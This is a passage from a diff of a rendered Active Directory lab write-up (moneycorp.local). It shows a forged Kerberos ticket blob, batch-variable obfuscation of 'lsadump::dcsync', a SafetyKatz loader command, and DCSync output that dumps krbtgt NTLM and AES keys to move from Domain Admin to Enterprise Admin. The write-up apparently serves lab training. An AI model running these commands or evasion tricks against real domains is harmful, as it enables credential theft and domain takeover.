class="n">hXKChpN2U2bAvzEWnhGKjr1CpGYFHwh9Gm3bVO</span><span class="p">/</span><span class="n">FRTAz8zsvv0ktJV9d</span><span class="p">+</span><span class="n">gKV4RX</span><span class="p">//</span><span class="n">Inym70trywxxlV0EPzrzMPeOelaQzN6pgRpy3jF8Befwtz</span><span class="p">+</span><span class="n">e4</span><span class="p">/</span><span class="n">GwEfU2uAnq7KbRGg9G</span><span class="p">/</span><span class="n">fLkjw6u8RDi4tN9yI8M5dbaGcfndyANlfPj6it</span><span class="p">/</span><span class="n">xuQk4XT9mF</span><span class="p">/</span><span class="n">wsOErcuGCoGWY4yyOfyVsayy8cTlsZteX1YO7ZJaK0ifv8Sv9LGSZQHrHaWoJdOKQoB</span><span class="p">/</span><span class="n">3C2QNeM5wfi0U8M6lCL9ye0</span><span class="p">+</span><span class="n">ExctTN5</span><span class="p">/</span><span class="n">ffYhzZoVzGgQdc1WKHREFUcCFK5PsIInvlPPmldu62uZ4vYfDSVL3lYFJ6</span><span class="p">+</span><span class="n">UFc3PPV1unzcE9U4IVmemPAKseCJnCiR4LakbZVxTBadf</span><span class="p">+</span><span class="n">2CqapeTio7D7Sl9J0PsbPJTSrbYKt8M4UGuSB</span><span class="p">+</span><span class="n">OlfRR5LlqRFc604vJQi83qZ0qdrnQT2wCldMgxMKdvHHnixPNrxUQHaag</span><span class="p">/</span><span class="n">DmI</span><span class="p">+</span><span class="n">PA5vlDgvLLljGKLiPAygZEN1xXNjoKcXFsw3oCvSWOopPS6FEmSaldmQKa0yJGc7xj8t</span><span class="p">/</span><span class="n">4IOt</span><span class="p">+</span><span class="n">dHhcGIhGjDz052ZVhV9YpVH3LBmS3q7r7</span><span class="p">/</span><span class="n">cBCHnxP4keJkaNujG</span><span class="p">+</span><span class="n">bPZoj8zu1wWED5MZ6JScQ1f6W1UiymQOSQPYohWcJRtS7GuFY3i5UQ1OzbUIzyZ0aS2TXmIwS</span><span class="p">/</span><span class="n">bTEQCz82d39apU7e2bbeMUJEiJNzyrgCK3SLf50ZKTFChcEtaAnvdawBw</span><span class="p">/</span><span class="n">XXQwEWuj8CcfVCg249NzXcCc7WlfCLXrnz5tjABS4gE0YH</span><span class="p">/</span><span class="n">QNC8rhnk1qz3W3LIy</span><span class="p">/</span><span class="n">aTJrCxVLmsfVZrOv3AnBQYWdCeSWUS7FTkBvphScmFJEpS4r2hmghT3hpmRe3</span><span class="p">/</span><span class="n">0aaTIWXbvqy4dIO45ibo3f1ZpSopwKo8xmgvHUOyCsGNEIUT9DrY3FbpkJU4PhEFxgF6OB8DCB7aADAgEAooHlBIHifYHfMIHcoIHZMIHWMIHToCswKaADAgESoSIEIL1</span><span class="p">+</span><span class="n">0dX7BYd3I7HC167NXtwXBfilsB</span><span class="p">/+</span><span class="n">8xSMnP0Rz0MxoREbD01PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCU1DT1JQLURDJKMHAwUAYKEAAKURGA8yMDI0MDYxMDEzMzg1NVqmERgPMjAyNDA2MTAyMzM4NTVapxEYDzIwMjQwNjE3MDQwNjQwWqgRGw9NT05FWUNPUlAuTE9DQUypJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD01PTkVZQ09SUC5MT0NBTA</span><span class="p">==</span>
-</code></pre></div>
-
-<p>We can run klist command to confirm the Cached Ticket as MCORP-DC$.</p>
-<p><code>klist</code></p>
-<p>Now, we can run DCSync from this process.</p>
-<p>Encoding our word with ArgSplit.bat again.
-<code>lsadump::dcsync</code></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set </span><span class="s2">&quot;z=c&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;y=n&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;x=y&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;w=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;v=c&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;u=d&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;t=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;s=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;r=p&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;q=m&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;p=u&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;o=d&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;n=a&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;m=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;l=l&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
-
-<p>Executing SafetyKatz for DCSync.</p>
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:mcorp\krbtgt /domain:moneycorp.local" "exit”</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local</span>
-<span class="no">[DC]</span> <span class="s1">&#39;moneycorp.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
-<span class="no">[DC]</span> <span class="s1">&#39;mcorp-dc.moneycorp.local&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
-<span class="no">[DC]</span> <span class="s1">&#39;mcorp\krbtgt&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
-<span class="no">[rpc]</span> <span class="n">Service</span>  <span class="p">:</span> <span class="n">ldap</span>
-<span class="no">[rpc]</span> <span class="n">AuthnSvc</span> <span class="p">:</span> <span class="n">GSS_NEGOTIATE</span> <span class="p">(</span><span class="n">9</span><span class="p">)</span>
-
-<span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">krbtgt</span>
-
-<span class="p">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="p">**</span>
-
-<span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">krbtgt</span>
-<span class="n">Account</span> <span class="nb">Type </span>        <span class="p">:</span> <span class="n">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
-<span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="n">00000202</span> <span class="p">(</span> <span class="n">ACCOUNTDISABLE</span> <span class="n">NORMAL_ACCOUNT</span> <span class="p">)</span>
-<span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span>
-<span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="n">11</span><span class="p">/</span><span class="n">11</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">46</span><span class="p">:</span><span class="n">24</span> <span class="n">PM</span>
-<span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">335606122</span><span class="p">-</span><span class="n">960912869</span><span class="p">-</span><span class="n">3279953914</span><span class="p">-</span><span class="n">502</span>
-<span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">502</span>
-
-<span class="n">Credentials</span><span class="p">:</span>
-  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">a0981492d5dfab1ae0b97b51ea895ddf</span>
-    <span class="n">ntlm</span><span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">a0981492d5dfab1ae0b97b51ea895ddf</span>
-    <span class="n">lm</span>  <span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">87836055143ad5a507de2aaeb9000361</span>
-
-<span class="n">Supplemental</span> <span class="n">Credentials</span><span class="p">:</span>
-<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">NTLM-Strong-NTOWF</span> <span class="p">*</span>
-    <span class="n">Random</span> <span class="n">Value</span> <span class="p">:</span> <span class="n">7c7a5135513110d108390ee6c322423f</span>
-
-<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos-Newer-Keys</span> <span class="p">*</span>
-    <span class="k">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCALkrbtgt</span>
-    <span class="k">Default</span> <span class="n">Iterations</span> <span class="p">:</span> <span class="n">4096</span>
-    <span class="n">Credentials</span>
-      <span class="n">aes256_hmac</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e</span>
-      <span class="n">aes128_hmac</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">801bb69b81ef9283f280b97383288442</span>
-      <span class="n">des_cbc_md5</span>       <span class="p">(</span><span class="n">4096</span><span class="p">)</span> <span class="p">:</span> <span class="n">c20dc80d51f7abd9</span>
-
-<span class="p">*</span> <span class="n">Primary</span><span class="p">:</span><span class="n">Kerberos</span> <span class="p">*</span>
-    <span class="k">Default</span> <span class="n">Salt</span> <span class="p">:</span> <span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCALkrbtgt</span>
-    <span class="n">Credentials</span>
-      <span class="n">des_cbc_md5</span>       <span class="p">:</span> <span class="n">c20dc80d51f7abd9</span>
-
-<span class="p">*</span> <span class="n">Packages</span> <span class="p">*</span>
-    <span class="n">NTLM-Strong-NTOWF</span>
-</code></pre></div>
-
-<p>We were able to escalate from Domain Admin to Enterprise Admin, moving from Child Domain to Parent Domain.</p>
+* Packages *
+    NTLM-Strong-NTOWF</code></pre><p class="" id="30c79e9a-d7c9-80b9-a59a-e4155a4e2940">We were able to escalate from Domain Admin to Enterprise Admin, moving from Child Domain to Parent Domain.</p><p class="" id="30c79e9a-d7c9-80ff-80c7-f7801cd05a8e">
+</p><p class="" id="30c79e9a-d7c9-80ab-b9c5-ca7e1a465ac3">
+</p><p class="" id="30c79e9a-d7c9-805f-9e64-d464c9fb0491">
+</p><p class="" id="30c79e9a-d7c9-80bb-ba39-fdf104f95767">
+</p><p class="" id="30c79e9a-d7c9-80c3-b99f-d0a43871faf2">
+</p><p class="" id="30c79e9a-d7c9-80b7-ae4e-f61e0b60d227">
+</p><p class="" id="30c79e9a-d7c9-80be-a1b0-d0624c4e2a4a">
+</p><p class="" id="30c79e9a-d7c9-8050-b96f-ed171119659f">
+</p><p class="" id="30c79e9a-d7c9-80cf-b1b4-c2bc3c25a158">
+</p><p class="" id="30c79e9a-d7c9-8074-84a3-d3649c41ba83">
+</p><p class="" id="30c79e9a-d7c9-8053-9fcf-ea586b8d716c">
+</p><p class="" id="30c79e9a-d7c9-8061-bbee-e52480e3e421">
+</p><p class="" id="30c79e9a-d7c9-8046-b366-d8de18328e0e">
+</p><p class="" id="30c79e9a-d7c9-8068-b235-d9777e8a7a68">
+</p><p class="" id="30c79e9a-d7c9-80d8-8e07-e9a5165f58a3">
+</p><p class="" id="30c79e9a-d7c9-8098-b6f5-eb3b4b9e4bc8">
+</p><p class="" id="30c79e9a-d7c9-80de-b91f-db92b06b2edc">
+</p><p class="" id="30c79e9a-d7c9-8062-a4f0-d41c1437af9b">
+</p><p class="" id="30c79e9a-d7c9-80c0-8d3c-e095aa958bad">
+</p><p class="" id="30c79e9a-d7c9-80a2-871c-e6cb167b7b91">
+</p><p class="" id="30c79e9a-d7c9-8076-b3ae-e183fef58948">
+</p><p class="" id="30c79e9a-d7c9-80cd-8f7c-d6cdc4d75b54">
+</p><p class="" id="30c79e9a-d7c9-80f0-b6f3-fea8f86d49d2">
+</p><p class="" id="30c79e9a-d7c9-8081-b1cb-edc95ae7adf1">
+</p><p class="" id="30c79e9a-d7c9-8034-b78e-ef2c1b63cb40">
+</p><p class="" id="30c79e9a-d7c9-80ce-b767-e635b08e11a7">
+</p><p class="" id="30c79e9a-d7c9-8029-87a2-dfe34e567396">
+</p>
           </div>
         </section>
       </article>
